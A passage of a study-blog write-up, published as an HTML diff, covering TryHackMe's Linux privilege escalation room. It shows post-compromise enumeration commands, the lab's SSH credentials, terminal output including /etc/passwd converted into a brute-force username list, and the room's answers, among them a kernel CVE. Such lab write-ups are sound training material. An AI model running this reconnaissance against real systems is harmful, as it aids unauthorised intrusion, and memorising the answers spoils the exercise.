@@ -1,0 +1,1318 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">THM Linux Privilege Escalation | jon112358 study Blog</title>
+<meta property="og:title" content="THM Linux Privilege Escalation | jon112358 study Blog" />
+<meta name="twitter:title" content="THM Linux Privilege Escalation | jon112358 study Blog" />
+<meta itemprop="name" content="THM Linux Privilege Escalation | jon112358 study Blog" />
+<meta name="application-name" content="THM Linux Privilege Escalation | jon112358 study Blog" />
+<meta property="og:site_name" content="Jon K study blog" />
+
+<meta name="description" content="this is a study blog where you will find what I have been up to">
+<meta itemprop="description" content="this is a study blog where you will find what I have been up to" />
+<meta property="og:description" content="this is a study blog where you will find what I have been up to" />
+<meta name="twitter:description" content="this is a study blog where you will find what I have been up to" />
+
+<meta property="og:locale" content="en-us" />
+<meta name="language" content="en-us" />
+
+
+
+  <meta itemprop="image" content="http://jon112358.com/" />
+  <meta property="og:image" content="http://jon112358.com/" />
+  <meta name="twitter:image" content="http://jon112358.com/" />
+  <meta name="twitter:image:src" content="http://jon112358.com/" />
+
+
+
+
+    
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-05-09T16:20:43-0700 />
+    <meta property="article:published_time" content=2023-05-09T16:20:43-0700 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "THM Linux Privilege Escalation",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-05-09",
+        "description": "",
+        "wordCount":  7717 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-05-09",
+        "image": {
+        "@type": "imageObject",
+        "url": ""
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "jon112358 study Blog"
+        }
+    }
+    </script>
+
+
+<meta name="generator" content="Hugo 0.111.3">
+
+    
+
+    <link rel="canonical" href="http://jon112358.com/posts/linux-privilege-escalation/">
+    <link href="/style.min.e8353c8bf6aa84457d3c7f65980d94548f249c91e6b37b15b9f1c7e13ceed431.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="http://jon112358.com/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    </head>
+<body data-theme = "dark" class="notransition">
+<script src="/js/themeLoader.min.3c3396ae9effcbd02e7064baa7b435ffe6560bcd7fec0b428a470d3a128f2220.js"></script>
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="http://jon112358.com/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title>Home</title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        Home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link active" href="/posts/">
+                        Posts
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/pages/about/">
+                        About
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">THM Linux Privilege Escalation</h1>
+                
+                <div class="post-meta">
+                    <time datetime="2023-05-09T16:20:43-07:00" itemprop="datePublished"> May 9, 2023 </time>
+                </div>
+            </header>
+            <details class="toc">
+                <summary><b>Table of Contents</b></summary>
+                <nav id="TableOfContents">
+  <ul>
+    <li><a href="#task-1-introduction">Task 1 Introduction</a></li>
+    <li><a href="#task-2-what-is-privilege-escalation">Task 2 What is Privilege Escalation?</a></li>
+    <li><a href="#task-3-enumeration">Task 3 Enumeration</a>
+      <ul>
+        <li><a href="#hostname">hostname</a></li>
+        <li><a href="#uname--a">uname -a</a></li>
+        <li><a href="#procversion">/proc/version</a></li>
+        <li><a href="#etcissue">/etc/issue</a></li>
+        <li><a href="#ps-command">ps Command</a></li>
+        <li><a href="#env">env</a></li>
+        <li><a href="#sudo--l">sudo -l</a></li>
+        <li><a href="#id">Id</a></li>
+        <li><a href="#etcpasswd">/etc/passwd</a></li>
+        <li><a href="#history">history</a></li>
+        <li><a href="#ifconfig">ifconfig</a></li>
+        <li><a href="#netstat">netstat</a></li>
+        <li><a href="#find-command">find Command</a></li>
+        <li><a href="#general-linux-commands">General Linux Commands</a></li>
+      </ul>
+    </li>
+    <li><a href="#task-3-notes">Task 3 notes</a></li>
+    <li><a href="#task-4-automated-enumeration-tools">Task 4 Automated Enumeration Tools</a></li>
+    <li><a href="#task-5-privilege-escalation-kernel-exploits">Task 5 Privilege Escalation: Kernel Exploits</a></li>
+    <li><a href="#task-6-privilege-escalation-sudo">Task 6 Privilege Escalation: Sudo</a></li>
+    <li><a href="#task-7-privilege-escalation-suid">Task 7 Privilege Escalation: SUID</a></li>
+    <li><a href="#task-8-privilege-escalation-capabilities">Task 8 Privilege Escalation: Capabilities</a></li>
+    <li><a href="#task-9-privilege-escalation-cron-jobs">Task 9 Privilege Escalation: Cron Jobs</a></li>
+    <li><a href="#task-10-privilege-escalation-path">Task 10 Privilege Escalation: PATH</a></li>
+    <li><a href="#task-11-privilege-escalation-nfs">Task 11 Privilege Escalation: NFS</a></li>
+    <li><a href="#task-12-capstone-challenge">Task 12 Capstone Challenge</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+            </details><div class="page-content">
+                <h1 id="thm-linux-privilege-escalation">THM Linux Privilege Escalation</h1>
+<h2 id="task-1-introduction">Task 1 Introduction</h2>
+<p>Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users&rsquo; passwords are a few key elements that will affect your road to the root shell.</p>
+<p>This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.</p>
+<p>Answer the questions below</p>
+<p>Read the above.</p>
+<h2 id="task-2-what-is-privilege-escalation">Task 2 What is Privilege Escalation?</h2>
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/603df7900d7b6f1dff18b0bd/room-content/2e51bfc8489168a3f6580dc76b46ba90.png" alt="">What does &ldquo;privilege escalation&rdquo; mean?</p>
+<p>At it&rsquo;s core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it&rsquo;s the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.</p>
+<p>Why is it important?</p>
+<p>It&rsquo;s rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:</p>
+<ul>
+<li>
+<p>Resetting passwords</p>
+</li>
+<li>
+<p>Bypassing access controls to compromise protected data</p>
+</li>
+<li>
+<p>Editing software configurations</p>
+</li>
+<li>
+<p>Enabling persistence</p>
+</li>
+<li>
+<p>Changing the privilege of existing (or new) users</p>
+</li>
+<li>
+<p>Execute any administrative command</p>
+</li>
+</ul>
+<p>Answer the questions below</p>
+<p>Read the above.</p>
+<h2 id="task-3-enumeration">Task 3 Enumeration</h2>
+<p><strong>Note: Launch the target machine attached to this task to follow along.</strong></p>
+<p><strong>You can launch the target machine and access it directly from your browser.</strong></p>
+<p>**Alternatively, you can access it over SSH with the low-privilege user credentials below:<br>
+**</p>
+<p><strong>Username: karen</strong></p>
+<p><strong>Password: Password1</strong></p>
+<p>Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don&rsquo;t end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.</p>
+<h3 id="hostname">hostname</h3>
+<p>The <code>hostname</code> command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).</p>
+<h3 id="uname--a">uname -a</h3>
+<p>Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.</p>
+<h3 id="procversion">/proc/version</h3>
+<p>The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.</p>
+<p>Looking at <code>/proc/version</code> may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.</p>
+<h3 id="etcissue">/etc/issue</h3>
+<p>Systems can also be identified by looking at the <code>/etc/issue</code> file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.</p>
+<h3 id="ps-command">ps Command</h3>
+<p>The <code>ps</code> command is an effective way to see the running processes on a Linux system. Typing <code>ps</code> on your terminal will show processes for the current shell.</p>
+<p>The output of the <code>ps</code> (Process Status) will show the following;</p>
+<ul>
+<li>PID: The process ID (unique to the process)</li>
+<li>TTY: Terminal type used by the user</li>
+<li>Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)</li>
+<li>CMD: The command or executable running (will NOT display any command line parameter)</li>
+</ul>
+<p>The “ps” command provides a few useful options.</p>
+<ul>
+<li><code>ps -A</code>: View all running processes</li>
+<li><code>ps axjf</code>: View process tree (see the tree formation until <code>ps axjf</code> is run below)</li>
+</ul>
+<p><img src="https://i.imgur.com/xsbohSd.png" alt=""></p>
+<ul>
+<li><code>ps aux</code>: The <code>aux</code> option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.</li>
+</ul>
+<h3 id="env">env</h3>
+<p>The <code>env</code> command will show environmental variables.</p>
+<p><img src="https://i.imgur.com/LWdJ8Fw.png" alt=""></p>
+<p>The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.</p>
+<h3 id="sudo--l">sudo -l</h3>
+<p>The target system may be configured to allow users to run some (or all) commands with root privileges. The <code>sudo -l</code> command can be used to list all commands your user can run using <code>sudo</code>.</p>
+<p>ls</p>
+<p>One of the common commands used in Linux is probably <code>ls</code>.</p>
+<p>While looking for potential privilege escalation vectors, please remember to always use the <code>ls</code> command with the <code>-la</code> parameter. The example below shows how the “secret.txt” file can easily be missed using the <code>ls</code> or <code>ls -l</code> commands.</p>
+<p><img src="https://i.imgur.com/2jOtOat.png" alt=""></p>
+<h3 id="id">Id</h3>
+<p>The <code>id</code> command will provide a general overview of the user’s privilege level and group memberships.</p>
+<p>It is worth remembering that the <code>id</code> command can also be used to obtain the same information for another user as seen below.</p>
+<p><img src="https://i.imgur.com/YzfJliG.png" alt=""></p>
+<h3 id="etcpasswd">/etc/passwd</h3>
+<p>Reading the <code>/etc/passwd</code> file can be an easy way to discover users on the system.</p>
+<p><img src="https://i.imgur.com/r6oYOEi.png" alt=""></p>
+<p>While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.</p>
+<p><img src="https://i.imgur.com/cpS2U93.png" alt=""></p>
+<p>Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.</p>
+<p><img src="https://i.imgur.com/psxE6V4.png" alt=""></p>
+<h3 id="history">history</h3>
+<p>Looking at earlier commands with the <code>history</code> command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.</p>
+<h3 id="ifconfig">ifconfig</h3>
+<p>The target system may be a pivoting point to another network. The <code>ifconfig</code> command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.</p>
+<p><img src="https://i.imgur.com/hcdZnwK.png" alt=""></p>
+<p>This can be confirmed using the <code>ip route</code> command to see which network routes exist.</p>
+<p><img src="https://i.imgur.com/PSrmz5O.png" alt=""></p>
+<h3 id="netstat">netstat</h3>
+<p>Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The <code>netstat</code> command can be used with several different options to gather information on existing connections.</p>
+<ul>
+<li><code>netstat -a</code>: shows all listening ports and established connections.</li>
+<li><code>netstat -at</code> or <code>netstat -au</code> can also be used to list TCP or UDP protocols respectively.</li>
+<li><code>netstat -l</code>: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)</li>
+</ul>
+<p><img src="https://i.imgur.com/BbLdyrr.png" alt=""></p>
+<ul>
+<li><code>netstat -s</code>: list network usage statistics by protocol (below) This can also be used with the <code>-t</code> or <code>-u</code> options to limit the output to a specific protocol.</li>
+</ul>
+<p><img src="https://i.imgur.com/mc8OWP0.png" alt=""></p>
+<ul>
+<li><code>netstat -tp</code>: list connections with the service name and PID information.</li>
+</ul>
+<p><img src="https://i.imgur.com/fDYQwbW.png" alt=""></p>
+<p>This can also be used with the <code>-l</code> option to list listening ports (below)</p>
+<p><img src="https://i.imgur.com/JK7DNv0.png" alt=""></p>
+<p>We can see the “PID/Program name” column is empty as this process is owned by another user.</p>
+<p>Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)</p>
+<p><img src="https://i.imgur.com/FjZHqlY.png" alt=""></p>
+<ul>
+<li><code>netstat -i</code>: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.</li>
+</ul>
+<p><img src="https://i.imgur.com/r6IjpmZ.png" alt=""></p>
+<p>The <code>netstat</code> usage you will probably see most often in blog posts, write-ups, and courses is <code>netstat -ano</code> which could be broken down as follows;</p>
+<ul>
+<li><code>-a</code>: Display all sockets</li>
+<li><code>-n</code>: Do not resolve names</li>
+<li><code>-o</code>: Display timers</li>
+</ul>
+<p><img src="https://i.imgur.com/UxzLBRw.png" alt=""></p>
+<h3 id="find-command">find Command</h3>
+<p>Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.</p>
+<p>Below are some useful examples for the “find” command.</p>
+<p><strong>Find files:</strong></p>
+<ul>
+<li><code>find . -name flag1.txt</code>: find the file named “flag1.txt” in the current directory</li>
+<li><code>find /home -name flag1.txt</code>: find the file names “flag1.txt” in the /home directory</li>
+<li><code>find / -type d -name config</code>: find the directory named config under “/”</li>
+<li><code>find / -type f -perm 0777</code>: find files with the 777 permissions (files readable, writable, and executable by all users)</li>
+<li><code>find / -perm a=x</code>: find executable files</li>
+<li><code>find /home -user frank</code>: find all files for user “frank” under “/home”</li>
+<li><code>find / -mtime 10</code>: find files that were modified in the last 10 days</li>
+<li><code>find / -atime 10</code>: find files that were accessed in the last 10 day</li>
+<li><code>find / -cmin -60</code>: find files changed within the last hour (60 minutes)</li>
+<li><code>find / -amin -60</code>: find files accesses within the last hour (60 minutes)</li>
+<li><code>find / -size 50M</code>: find files with a 50 MB size</li>
+</ul>
+<p>This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.</p>
+<p><img src="https://i.imgur.com/pSMfoz4.png" alt=""></p>
+<p>The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2&gt;/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).</p>
+<p><img src="https://i.imgur.com/UKYSdE3.png" alt=""></p>
+<p>Folders and files that can be written to or executed from:</p>
+<ul>
+<li><code>find / -writable -type d 2&gt;/dev/null</code> : Find world-writeable folders</li>
+<li><code>find / -perm -222 -type d 2&gt;/dev/null</code>: Find world-writeable folders</li>
+<li><code>find / -perm -o w -type d 2&gt;/dev/null</code>: Find world-writeable folders</li>
+</ul>
+<p>The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.</p>
+<p><img src="https://i.imgur.com/qb0klHH.png" alt=""></p>
+<ul>
+<li><code>find / -perm -o x -type d 2&gt;/dev/null</code> : Find world-executable folders</li>
+</ul>
+<p>Find development tools and supported languages:</p>
+<ul>
+<li><code>find / -name perl*</code></li>
+<li><code>find / -name python*</code></li>
+<li><code>find / -name gcc*</code></li>
+</ul>
+<p>Find specific file permissions:</p>
+<p>Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.</p>
+<ul>
+<li><code>find / -perm -u=s -type f 2&gt;/dev/null</code>: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.</li>
+</ul>
+<h3 id="general-linux-commands">General Linux Commands</h3>
+<p>As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as <code>find</code>, <code>locate</code>, <code>grep</code>, <code>cut</code>, <code>sort</code>, etc.</p>
+<p>Answer the questions below</p>
+<p>What is the hostname of the target system?<br>
+A: wade7363
+What is the Linux kernel version of the target system?<br>
+A: 3.13.0-24-generic
+What Linux is this?<br>
+A: Ubuntu 14.04 LTS
+What version of the Python language is installed on the system?<br>
+A: 2.7.6
+What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)
+A: CVE-2015-1328</p>
+<h2 id="task-3-notes">Task 3 notes</h2>
+<p>$ hostname
+wade7363</p>
+<p>$ uname -a
+Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</p>
+<p>$ cat /proc/version
+Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014</p>
+<p>$ cat /etc/issue
+Ubuntu 14.04 LTS \n \l</p>
+<p>$ ps
+PID TTY          TIME CMD
+1629 pts/4    00:00:00 sh
+1759 pts/4    00:00:00 ps</p>
+<p>note: ps -A for all running processes
+ps axjf view process tree - I think this is more useful
+ps aux will show processes for all users -may be better sometimes</p>
+<p>$ env
+MAIL=/var/mail/karen
+USER=karen
+SSH_CLIENT=10.13.27.214 44060 22
+HOME=/home/karen
+SSH_TTY=/dev/pts/4
+QT_QPA_PLATFORMTHEME=appmenu-qt5
+LOGNAME=karen
+TERM=st-256color
+XDG_SESSION_ID=1
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+XDG_RUNTIME_DIR=/run/user/1001
+LANG=en_US.UTF-8
+SHELL=/bin/sh
+PWD=/
+SSH_CONNECTION=10.13.27.214 44060 10.10.202.224 22</p>
+<p>$ ls -al
+total 104
+drwxr-xr-x  23 root root  4096 Jun 18  2021 .
+drwxr-xr-x  23 root root  4096 Jun 18  2021 ..
+drwxr-xr-x   2 root root  4096 Jun 18  2021 bin
+drwxr-xr-x   3 root root  4096 Jun 18  2021 boot
+drwxrwxr-x   2 root root  4096 Jun 18  2021 cdrom
+drwxr-xr-x  13 root root  3920 Feb  2 19:42 dev
+drwxr-xr-x 129 root root 12288 Feb  2 19:43 etc
+drwxr-xr-x   3 root root  4096 Jun 18  2021 home
+lrwxrwxrwx   1 root root    33 Jun 18  2021 initrd.img -&gt; boot/initrd.img-3.13.0-24-generic
+drwxr-xr-x  23 root root  4096 Jun 18  2021 lib
+drwxr-xr-x   2 root root  4096 Apr 16  2014 lib64
+drwx&mdash;&mdash;   2 root root 16384 Jun 18  2021 lost+found
+drwxr-xr-x   2 root root  4096 Apr 16  2014 media
+drwxr-xr-x   2 root root  4096 Apr 10  2014 mnt
+drwxr-xr-x   2 root root  4096 Apr 16  2014 opt
+dr-xr-xr-x 155 root root     0 Feb  2 19:42 proc
+drwx&mdash;&mdash;   2 root root  4096 Jun 18  2021 root
+drwxr-xr-x  22 root root   760 Feb  2 19:44 run
+drwxr-xr-x   2 root root 12288 Jun 18  2021 sbin
+drwxr-xr-x   2 root root  4096 Apr 16  2014 srv
+dr-xr-xr-x  13 root root     0 Feb  2 19:42 sys
+drwxrwxrwt   4 root root  4096 Feb  2 19:47 tmp
+drwxr-xr-x  10 root root  4096 Apr 16  2014 usr
+drwxr-xr-x  13 root root  4096 Apr 16  2014 var
+lrwxrwxrwx   1 root root    30 Jun 18  2021 vmlinuz -&gt; boot/vmlinuz-3.13.0-24-generic</p>
+<p>$ id
+uid=1001(karen) gid=1001(karen) groups=1001(karen)</p>
+<p>$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
+dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
+saned:x:108:115::/home/saned:/bin/false
+whoopsie:x:109:116::/nonexistent:/bin/false
+speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
+colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
+hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
+karen:x:1001:1001::/home/karen:
+sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin</p>
+<p>$ cat /etc/passwd | cut -d &ldquo;:&rdquo; -f 1
+root
+daemon
+bin
+sys
+sync
+games
+man
+lp
+mail
+news
+uucp
+proxy
+www-data
+backup
+list
+irc
+gnats
+nobody
+libuuid
+syslog
+messagebus
+usbmux
+dnsmasq
+avahi-autoipd
+kernoops
+rtkit
+saned
+whoopsie
+speech-dispatcher
+avahi
+lightdm
+colord
+hplip
+pulse
+matt
+karen
+sshd</p>
+<p>$ cat /etc/passwd | grep home
+syslog:x:101:104::/home/syslog:/bin/false
+usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
+saned:x:108:115::/home/saned:/bin/false
+matt:x:1000:1000:matt,,,:/home/matt:/bin/bash
+karen:x:1001:1001::/home/karen:</p>
+<p>$ history
+-sh: 22: history: not found</p>
+<p>$ ifconfig
+eth0      Link encap:Ethernet  HWaddr 02:36:d4:a8:12:3b
+inet addr:10.10.202.224  Bcast:10.10.255.255  Mask:255.255.0.0
+inet6 addr: fe80::36:d4ff:fea8:123b/64 Scope:Link
+UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
+RX packets:832 errors:0 dropped:0 overruns:0 frame:0
+TX packets:671 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:1000
+RX bytes:66508 (66.5 KB)  TX bytes:133197 (133.1 KB)</p>
+<p>lo        Link encap:Local Loopback
+inet addr:127.0.0.1  Mask:255.0.0.0
+inet6 addr: ::1/128 Scope:Host
+UP LOOPBACK RUNNING  MTU:65536  Metric:1
+RX packets:125 errors:0 dropped:0 overruns:0 frame:0
+TX packets:125 errors:0 dropped:0 overruns:0 carrier:0
+collisions:0 txqueuelen:0
+RX bytes:9025 (9.0 KB)  TX bytes:9025 (9.0 KB)</p>
+<p>$ ip add
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default
+link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+inet 127.0.0.1/8 scope host lo
+valid_lft forever preferred_lft forever
+inet6 ::1/128 scope host
+valid_lft forever preferred_lft forever
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
+link/ether 02:36:d4:a8:12:3b brd ff:ff:ff:ff:ff:ff
+inet 10.10.202.224/16 brd 10.10.255.255 scope global eth0
+valid_lft forever preferred_lft forever
+inet6 fe80::36:d4ff:fea8:123b/64 scope link
+valid_lft forever preferred_lft forever</p>
+<p>$ ip route
